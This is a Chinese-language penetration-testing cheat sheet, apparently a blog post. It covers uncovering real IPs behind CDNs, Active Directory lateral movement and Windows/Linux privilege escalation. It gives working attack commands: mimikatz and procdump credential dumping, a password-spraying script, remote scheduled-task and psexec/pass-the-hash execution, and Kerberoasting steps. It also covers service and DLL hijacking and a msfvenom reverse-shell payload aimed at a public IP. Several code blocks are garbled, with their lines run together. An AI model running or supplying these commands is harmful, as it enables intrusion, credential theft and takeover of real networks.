浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip

1. 查询子域名。对子域名进行ip扫描。但这会有三种情况，一种是子域名与主域名同个ip,或同个网段，或完全不同的ip

2. 耗尽CDN资源/以量打量。CDN付费是比如100M流量购买，所以如果你通过请求访问完网站的CDN那么你将会获得真实的ip
3. ip历史记录解析查询法。
   有的网站是后来才加入CDN的，所以只需查询它的解析历史即可获取真实ip，这里我们就简单介绍几个网站：微步在线dnsdb.ionetcraft(http://toolbar.netcraft.com/),Viewdns(http://viewdns.info/)等等。

4. 网站漏洞查找法
   通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。

5. 网站订阅邮件法
   利用原理：邮件服务器 大部分不会做CDN 利用注册，因为邮箱一般都是给内部人使用的，且一般邮箱都是主动给人发比如找回密码等邮件，当客户邮箱收到你的邮件时这时候会自动同个ip识别是不是垃圾邮件是不是官方邮件。使用方法：找回密码等网站发送邮件进行验证，获取验证码，查看邮件代码获取IP地址。
   如下是foxmail
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629164915844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629165428490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

6. 网络空间引擎搜索法
   常见的有以前的钟馗之眼，shodan(https://www.shodan.io/)，fofa搜索(https://fofa.so/)。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。
   利用网络空间搜索时，你还可以先获取一个网站的ico的hash值，将hash值在空间搜索引擎中查找
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171639945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
   ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629171847888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


8. F5 LTM解码法
   当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。

9. 国外地址请求

利用原理：开发员认为用户群体主要在国内，因此只针对于中国地区进行cdn防护,没有部署国外访问的CDN的访问节点
(1)利用国外ping对目标进行ping检测（尽量使用少见国家）
(2)利用VPN全局代理利用CMD进行PING检测

如图是使用工具进行多个国家ping结果 https://whoer.net/zh/ping
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629163852104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
https://tools.ipip.net/dns.php
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701225359245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

9. 对网站的APP抓包,
10. 使用全网扫描工具比如：fuckcdn,w8fuckcdn,zmap；但是这些工具都不太好用
    首先从 apnic 网络信息中心获取ip段，然后使用Zmap的 banner-grab 对扫描出来 80 端口开放的主机进行banner抓取，最后在 http-req中的Host写我们需要寻找的域名，然后确认是否有相应的服务器响应。

11. 第三方扫描平台，输入链接即可查找  https://get-site-ip.com/
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629160737324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
    或者 https://s.threatbook.cn/![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629161729418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**最终确认**
你可能通过不同方法查询后将会获得多个ip作为可怀疑对象，这时候你需要最终确认ip所在地

12. 查询ip地址所在地。观察网页归属地。或者更深入你的你应该查询管理员属于哪里人公司位于哪里云云
    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629165616321.png)
13. 修改host文件中的www.xxx.com和xxx.com文件，用ping确定后再访问看能否打开网页
14. 直接在网页中访问IP地址  

# 内网渗透

## 基础

内网也指局域网，即一个区域内多台计算机互联的计算机组。局域网可以实现共享文件、打印机等
大多数为了安全都公司设置了公司内网。这时候如下图所示，当黑客成功越过第一道防火墙后，还有一堵墙，即进入了demilitarized zone（DMZ）。内网渗透的目的是穿过DMZ到内网。内网通常有专门管理文件的、网站服务器、个人PC机等。

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/26d3bec2b841ffece0ae7778589a52ab.png)
从技术复杂度与功能上来说，windows比linux更适合做AD域。因此一般来说内网攻击是指的对windows系统。
内网渗透你需要运用提权知识将你的权限提至于adminstartor，因为很多内网渗透工具是需要adminstartor权限才可以运行。域与域之间在没有建立信任关系下是不能访问的

**术语**
工作组：平级。每台计算机都是独立的，每台计算机一开始都默认分配了工作组。
域环境： 非平级。比如机房上课老师统一控制电脑
域控制器(DC)：类似于域管理员身份
活动目录(AD):活动目录将所有的计算机当做像文件夹一样的访问。域控制器就是因为有了AD所以能控制别人电脑

本地域组：本域成员只能访问本域。本地域组其中管理员组拥有最高权限
全局组：本域成员可以跨域访问。类似于你拥有特权后可以访问外网。域管理组所在位置
通用组：他域+本域成员可以跨域访问。
**重点：流程**
可以用lodan一键代替
起点是获得了跳板机（域下某个用户）本地用户权限user，目标是拿下DC域下其他用户。
当我们获得跳板机的user，先进行提权到admins权限。如果你非不想提权，在未打KB2871997补丁情况下就可以用PTH连接；已打补丁用PTK。（本文未介绍此方法，具体自行参考百度）
信息搜集：搜集所属域下其他计算机名，ip,是否开放445/135；搜集本机adminstor明文密码，没有明文收集个hash密码也是可以的。
建立爆破字典：自定义+常用字典，对其他计算机进行密码爆破。
爆破成功后一组就可以进行控制上传木马等操作了。
*补充：流程很可能还会用到免杀等技巧；如果跳板机存在MS14-068则直接利用user权限就可以获得自己提升到域管权限*

**windows常见身份**
系统默认常见用户身份：
Domain Admains：域管理员（默认对域控制器有完全控制权）
Domain Computers：域内机器
Domain Controllers：域控制器
Domain Guest：域访客，权限低
Domain users：域用户（大多数拿到权限，首先得到的是此身份）
Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权 ）

### 信息搜集

信息搜集主要是搜集当前所在的AD域以及环境。
**基本信息搜集**
旨在了解当前服务器的计算机基本信息与权限，为后续判断服务器角色，网络环境等做准备
systeminfo 详细信息
net start 启动信息
tasklist 进程列表
schtasks 计划任务

**网络信息搜集**
旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备

net time /domain 查看主域名。因为域下计算机时间都来自于AD域，所以这里就能打印得出。当然获取还有很多方式比如查看计算机属性等。

netstat -ano 查看本机开放的全部端口
nslookup 追溯域名（用这个命令追溯主域名） 追踪来源地址

****

**用户信息搜集**
旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试
whoami /all 用户权限
net config workstation 登录信息
net localgroup 本地用户组
net user /domain 当前域里面的用户
net group /doamin 获取域用户组信息
wmic useraccount get /all 涉及域用户详细信息
net group "Domain Admins/或写user" /domain 查询域管理员/ 用户账户
net group "Enterprise Admins" /domain 查询管理员用户组
net group "Domain Controllers" /domain 查询域控制器

****

**端口扫描**
不推荐nmap原因是nmap需要安装，nmap扫描可能会留下痕迹

```bash
# 系统自带内部命令，不易被察觉for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL =" 
```

****

**推荐工具**
nishang
采用powershell 脚本开发，系统语言所以一般不用做免杀。工具强大包含了mimikatz、扫描端口还有一系列信息搜集工具。类似于一个功能包
还可以做扫描ip端口工具![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/b2dba5f5163f0bfdc32385b85a3be76e.png)

### 获取明文密码 

选一种可行的方案,直到你获得密码。我本机装有火绒，我发现当我实验以下工具时，基本都会被杀掉。
**工具0：mimikatz**
这是一种很经典的获取内网密码的方式。
现在你可以直接打开mimikatz输入以下命令进行获取当前admin明文密码。

```bash
privilege::debug# 获取明文密码、NTLMsekurlsa::logonpasswords full# 获取AES值sekurlsa::ekeys
```

如果遇到上述情况失败等，你可以采用procdump+mimikatz获取密码。procdump在微软官方下载可以将密码转化为hash值

```bash
# 在敌方系统执行，将生成的lsass.dmp保存到自己电脑 procdump -accepteula -ma lsass.exe lsass.dmp# 在自己电脑上执行mimikatz上执行，以获得明文密码： sekurlsa::minidump lsass.dmp
```

**工具1: 从 Windows 凭据管理器和浏览器获取密码**
Windows 凭据管理器是 Windows 的默认功能，用于保存系统、网站和服务器的用户名、密码和证书。记不记得当你使用 Microsoft IE/EDGE 对网站进行身份验证后，通常会弹出一个弹出窗口，询问“是否要保存密码？”凭证存储就是存储这些信息的地方，在凭据管理器中，有两种类型的凭据：Web 和 Windows。你还记得哪个用户有权访问这些数据吗？它不是 system，而是登录后可以检索此信息的用户。这对我们来说是很好的，就像任何钓鱼网站或代码执行一样，我们通常都可以用别的方法获得那个用户的权限。最好的一点是，我们甚至不需要成为本地管理员来提取这些数据。
如何提取这些信息呢？我们可以使用两种不同的 PowerShell 脚本导入以收集此数据：

收集网络凭据：
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
收集 Windows 凭证（只收集通用的而不是目标域特有的）
https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1

**工具2： XenArmor**
 强大，根据你的电脑安全性而定，有人用他获得了所有密码，而我只用它获得了我的WIFI密码
破解链接，不知道安不安全，但是我装成功了https://www.sdbeta.com/wg/2020/0514/234852.html


#### windows 2012

管理的用户明文密码获取，利用工具获得明文密码前提是本身是高权限用户，如root，如AD域管理员。
当满足：

 - windows2012以下版本未安装KB2871997补丁
 - 如果是windows2012以上版本默认是关闭wdigest。这时候你需要预先在注册表操作开启服务，即修改wdigest的值改为1

#### windows10

（以下参考于）
在 Windows 10之前，以本地管理员的身份在主机系统上运行 Mimikatz 的话是允许攻击者从 lsass（本地安全机构子系统服务）中提取明文密码的。这种方法在 Windows 10 出现之前非常有效，而在 windows 10 中，即使你是本地管理员，也无法直接读取它，使用此工具获取密码是空。
但是你可以通过如单点登录（ SSO ）或者一些特殊的软件会把密码保存在 LSASS 进程中让 Mimikatz 读取；
最简单的选项是设置注册表项以让系统将密码凭证保存到 LSASS 进程。在 HKLM 中，有一个 UseLogonCredential 设置，如果设置为0，系统将在内存中存储凭据
![在这里插入图片描述](https://img-blog.csdnimg.cn/3a6914a24a044057b33c35ae442fa2ce.png)
这个注册表修改的问题就是需要用户重新登录到系统。你可以让目标机器屏幕锁屏、重新启动或注销用户，以便你能够捕获然后再次发送凭证文本。最简单的方法是锁定他们的工作机器（这样他们就不会丢失他们的当前的工作…看看我有多好！）。要触发锁屏：

rundll32.exe user32.dll，LockWorkStation
一旦我们锁定屏幕，并让它们重新登录，我们就可以重新运行 Mimikatz 来获得明文密码。

![在这里插入图片描述](https://img-blog.csdnimg.cn/58fa73fde87c466dba0ac4439c4c178d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

####  Mac

有多个渗透攻击框架的 payload 支持 Mac，我最喜欢的是使用 Empire。Empire 可以生成多个 payload 来诱骗受害者执行我们的代理，其中包括 Ducky scripts、二进制可执行程序、Office 宏、Safari 启动程序、pkg 安装包等等。

####  Linux

内核漏洞提权很难成功，因为内核提权对内核的版本，还有目标机器的环境要求很高(需要安装有gcc等编译环境来运行exp)

查看基础信息

```bash
uname -a                 #查看内核的具体信息cat /proc/version        #查看内核的具体信息cat /etc/centos-release  #查看centos发行版本cat /etc/redhat-release  #查看redhat发行版本
```

查看该内核可能存在的漏洞

```bash
./Linux_Exploit_Suggester.pl 
```

#####  脏牛提权

**漏洞范围**:Linux内核 >= 2.6.22（2007年发行，到2016年10月18日才修复）

**简要分析**：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。
exp：https://github.com/gbonacini/CVE-2016-5195

#####  SUID提权

#####  SUDO提权

#####  LINUX配置错误提权

还有就是利用Linux的配置文件错误，导致 /etc/passwd 文件可写入提权：Linux提权之利用 /etc/passwd 文件

对Linux配置进行检查的脚本有：https://www.securitysift.com/download/linuxprivchecker.py

#####  定时任务提权

系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写，我们就可以修改脚本进行提权了。

```bash
ls -l /etc/cron*
```

使用该命令，列出的文件，查看 /etc/cron.daily 、/etc/cron.hourly、/etc/cron.monthly、/etc/cron.weekly 这四个文件夹内的文件，查看是否允许其他用户修改。如果 允许任意用户修改，那么我们就可以往这些文件里面写入反弹shell的脚本提权了

#####  密码复用提权

我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码。那么就可以尝试一下 su root 来提权了。
我们还可以查看主机上其他的第三方服务，利用第三方服务的漏洞可以拿到主机的 root 权限。比如如果主机的mysql或tomcat是用root权限启动的，而我们又通过漏洞拿到了mysql或tomcat的权限，就相当于获得了root的权限。


##### 第三方服务提权

# 横向渗透


####  传递爆破其他账户密码

这里主要是字典构建，即常用字典+自定义字典。
自定义字典来自于你首先获得的用户密码，然后将这个密码以及密码格式尝试爆破别的ip密码。
采用爆破，爆破有三个变量：密码（hash、明文）、ip、用户（信息搜集到的主机名）

```bash
import os,timeips={   '192.168.3.21',   '192.168.3.25',   '192.168.3.29',}users={   'Administrator',   'boss',   'dbadmin',}passs={   'admin',   'admin!@#45',   'Admin12345'}for ip in ips:   for user in users:       for mima in passs:           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user           print('--->'+exec+'<---')           os.system(exec)           time.sleep(1)
```

编写完脚本后打包成exe

#### 控制方法1：定时任务放后门

定时不仅可以用来提权还可以用来做连接。
这步是基于你完成上个小节获取明文密码后。经过端口扫描发现对方开放了139/445（共享文件端口、一般都是开放的）端口。因此你可以做以下操作进行存放特殊文件达到连接控制。
**at < Windows2012**

```bash
net use \192.168.3.21\ipc$ "密码" /user:god.org\administrator # 建立ipc连接：copy add.bat \192.168.3.21\c$  #拷贝执行文件到目标机器at \192.168.3.21 15:47 c:\add.bat    #添加计划任务
```

**schtasks >=Windows2012**

```bash
net use \192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator # 建立ipc连接：copy add.bat \192.168.3.32\c$ #复制文件到其C盘schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F #创建adduser任务对应执行文件schtasks /run /s 192.168.3.32 /tn adduser /i #运行adduser任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
```

或者在工具不被杀毒软件干掉情况下，你可以直接用别人写好的工具，更简洁还支持hash值连接。
atexec-impacket

```bash
atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
```


#### 控制方法2：建立连接

以下连接是建立在开放了SMB协议下。
为了省去你替工具做免杀的劳苦工作，当你获得主机的明文密码时，直接用微软官方自带工具psexec进行远程连接

```bash
psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
```

没有明文，那用第三方包smbexec

```bash
smbexec god/administrator:Admin12345@192.168.3.21smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
```

### SPN

服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。

黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。
**探针**

```bash
# 类似于隐蔽的nmap扫描端口结果setspn -q */*setspn -q */* | findstr "MSSQL"
```

**请求**

```c
Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"mimikatz.exe "kerberos::ask /target:xxxx"
```

**导出**

```bash
mimikatz.exe "kerberos::list /export"
```

**破解**

```bash
python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
```

**重写**

```bash
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # 将生成的票据注入内存
```

## linux渗透

### 信息搜集

网络信息:

netstat -anop | findstr LISTEN
net group “Domain Admins” /domain
流程列表:

tasklist /v
系统主机信息:

sysinfo
Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt
wmic qfe get Caption，Description，HotFixID，InstalledOn
简单的文件搜索:

dir /s password
findstr /s /n /i /p foo *
findstr /si pass .txt | .xml | *.ini
来自共享/挂载驱动器的信息:

powershell -Command “get-WmiObject -class Win32_Share”
powershell -Command “get-PSDrive”
powershell -Command “Get-WmiObject -Class Win32_MappedLogicalDisk | select Name， ProviderName”

# 杂项


## 获取数据库账号密码

### mysql

#### 获取基本信息

**版本**

#### 获取root账号密码

**获取明文密码**

1. 一般存在源码中配置文件或全局文件等
   2.存在mysql文件夹的user.mvd文件（.mvd格式存储的就是表的内容；）或者你直接读取mysql.user表 ;这时候的密码通常都是用md5加密的，需要用cmd5工具解密
   **暴力破解（了解数据库是否支持外联）**
   mysql的root不支持外联，所以你怎么爆破都爆破失败。浙石化你需要将脚本上传到对方服务器上执行爆破文件才有可能爆破成功。百度搜索：mysql爆破脚本；对方如果是python语言环境就上传python脚本，是php就上传php...

**sqlmap 注入的 --sql-shell 模式**

#### Oracle

一般网站是jsp。jsp有个特点是你获取到网站权限不需要提权直接就是system权限

### MssQL

最高权限sa,支持外联。外联可以用navicat或mssql数据库自带连接工具

### Redis

redis支持网络     可基于内存、可持久化的日志类型数据库.key-value数据库
端口号6379 
一般是linux系统

####  PostgreSQL

数据库高权限账号名是postgres

## 提权

后台权限（获得方式：爆破，SQL注入猜解，弱口令）：
	一般网站或者应用后台只能操作应用的界面内容数据，图片等叫做后台权限
	无法操作程序的源代码或者服务器上的资源文件。（如果后台存在功能文件操作的话，可以操作文件数据也可以--文件操作管理器--）
	
网站权限（后台，漏洞，第三方）：
	查看和修改（是否限制了管理员用户）程序源代码，可以进行网站或者应用的配置文件读取（接口配置信息，数据库配置信息），为后续收集服务器操作系统相关的的信息，为后续提权做准备。
	
数据库权限：
	只能操作数据库用户，数据库的增删改。源码或者配置文件泄露，也可能是网站权限进行的数据库配置文件读取获得。
	
接口权限：
	短信支付等接口，邮件接口，第三方登录接口。
	修改网站支付接口，改为自己。邮件，短信接口。
	后台权限，网站权限后的获取途径：后台（修改配置信息），网站权限（查看配置文件信息）
	
权限划分：补充webshell权限，webshell权限比普通用户低一点，比来宾用户大

本地权限：本地权限一般是内网渗透最初身份，通常是user，因此能用在webshell提权的都能用在本地提权上

****

提权一般都会进入tmp目录操作，即C:/tmp与/tmp 因为这个目录不需要高权限就可以写入

### 提权准备

提权可能是你利用SQL注入等获得高权限。当你需要打开web的cmd窗口执行更多操作时，你上传的是一个bat文件，文件内容是cmd.exe  



**了解当前系统情况**

```bash
whoami# 看系统、版本号、修复信息systeminfo
```


### window提权

windows权限分为四种，由低到高的权限分别是user，administrator，system，trustedinstaller。提权分为纵向和横向。

#### 提权方法

##### 系统内核溢出漏洞提权

用户输入数据大小超过了缓存区大小，程序就会溢出

信息搜集工具选其一，顺手即可
**获取exp**
常见的公开漏洞要自己收集，具体怎么搜集后续我补充

```bash
# 写错了！！有bug。。systeminfo > windows.txt|(for %i in (KB5003537 KB2160329 等常见的公开漏洞)do @find /i "%i">null||@echo %i bug here! )
```

或者你直接对输出的systeminfo利用kali 将提取任何给定的 Windows 主机的所有补丁安装历史记录。我们可以拿回这个输出结果，将其复制到我们的 Kali 系统并运行 Windows Exploit Suggester 以查找已知的漏洞然后针对性的进行漏洞利用从而提升权限。
回到你攻击的系统：

systeminfo
systeminfo > windows.txt
将 windows.txt 复制到你的 Kali 虚拟机的 /opt/Windows-Exploit-Suggester 下
python ./windows-exploit-suggester.py -i ./windows.txt -d 2018-03-21-mssb.xls

![在这里插入图片描述](https://img-blog.csdnimg.cn/87574b84d19942bd99285b622de37069.png)

这个工具已经有一段时间没有被维护了，但是你还是可以轻松地从中寻找到你正需要的能权限提升的漏洞。

**寻找exp：wes**
项目链接： https://github.com/bitsadmin/wesng
这个项目执行条件轻松，只需要对方的systeminfo就可以导出疑似的漏洞了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231022310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
最后生成的是一个资源列表，表明了可能存在的漏洞以及公开的exp。这时候你要注意筛选，看这些漏洞是否可用是否能达到提权效果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718231655167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

**寻找exp：windowsvulnscan**
项目链接： https://github.com/chroblert/WindowsVulnScan
主要应用在web层

**寻找exp**

优先选用MSF,但是MSF通常连带插件是半年更新一次，所以一般不会有新漏洞的EXP。这时候你就要善用搜索引擎了，已解释过如何搜索，不再重复



#### win2003

计划任务运行时会用系统权限执行
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131459291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131513127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### win7

win2003也可以执行

sc也可将admin提升为system
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719131935411.png)

#### win2008

在微软官方下载pstools 。然后在cmd执行以下命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719132156791.png)

#### Windows2008&7令牌窃取提升-本地

当你获得系统的admin（但普通的webshell权限不行），令牌窃取就可以直接将权限提升到system。
进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。本地提权实验:获取会话-利用模块-窃取令牌-提权
Microsoft windows XP Professional SP3和之前版本

执行方法，利用msf获得反弹之后在msf中执行以下命令：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719165548297.png)


#### 不安全的服务权限配合MSF-本地权限

即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。

这大部分是本地提权因为webshell的权限达不到administrators，而普通的user权限通常系统是没有服务的。

##### 攻击过程

在微软官方下载accesschk.exe执行以下命令，如果你是user权限就将administrators换成users。如果提示无效账户名，那么就代表这种方法行不通，行得通窗口将出现打印的服务名。

accesschk.exe -uwqs “administrators”  *

行得通就执行

sc config.exe "服务名（皇上，根据前面打印的服务名，选个妃子吧）" binpath="修改的服务名的路径,通常是木马（如c:\test.exe）"

sc start "刚重置位置的服务名"

如下图是简约展示版本：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720133154875.png)


#### win2012不带引号服务路径配合MSF-Web,本地权限

原理：当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。
漏洞主要看第三方在配置系统时有没有按照规范来加引号，如果都规范了都加引号了，这方法就行不通。
比如输入命令c:/bei gai/ -c不加引号就可能编程目录为c:/bei后门gai/和-c是参数

##### 攻击过程

攻击原理是利用了windows启用服务都是system权限。
检测引号未加上的服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功

```bash
# 在cmd中输入以下命令以检测哪些服务未加上引号# 但这个代码返回的路径可能是包含空格的，也可能是没有。筛选掉没有空格的wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

下图是我在cmd窗口执行的结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720104505573.png)
所以如果你要攻击我就很简单，下一步在D盘目录下创建一个名为Program的木马exe文件;
一旦管理员启动了服务，不会触发服务了，只会触发木马


#### win2012DLL劫持提权应用配合MSF-Web权限

原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：

1、应用程序加载的目录

2、C:\Windows\System32

3、C:\Windows\System

4、C:\Windows

5、当前工作目录Current Working Directory，CWD

6、在PATH环境变量的目录（先系统后用户）

过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功。这里替换dll通常会利用进程分析工具如火绒剑分析，dll替换应替换管理员会运行的系统文件，但这系统文件权限又没有特别高的，通常一些三方软件文件最合适。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720102304652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll >/opt/test.dll

#### Win2012烂土豆提权

所谓的烂土豆提权就是俗称的MS16-075
可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。
前提：需要对方服务器拥有net framework4.0

##### 提权原理

RottenPotato(烂土豆)提权的原理可以简述如下：
1.欺骗"NT AUTHORITY\SYSTEM"账户通过NTLM认证到我们控制的TCP终端
2.对这个认证过程使用中间人攻击（NTLM重放），为"NT AUTHORITY\SYSTEM"账户本地协商一个安全令牌。这个过程是通过一系列的windows API调
用实现的
3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务器账户（IIS,MSSQL）有这个权限，大多数用户级
的账户没有这个权限。
所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，发现使用已经创建好的账户（就是用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但是使用菜刀(iis服务器权限)反弹meterpreter就会成功
烂土豆比热土豆的优点是：
1.100%可靠
2.全版本通杀（当时）
3.立即生效，不会像hot potato那样有时候需要等windows更新才能使用
总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二部挑战应答过程中认证的区块改为自己的区块获取SYSTEM令牌，然后MSF模仿令牌。
更多看 https://blog.csdn.net/god_zzZ/article/details/106334702

##### 提权过程

低权限提权高权限

```bash
upload/root/potato.exe C: \Users \ Publiccd C: \ (Users \ \ Publicuse incognitolist_tokens -uexecute -cH -f ./potato.exelist_tokens -uimpersonate token "NT AUTHORITY\ \SYSTEM"
```

### LINUX提权

提权目的是要提权到最高权限root。

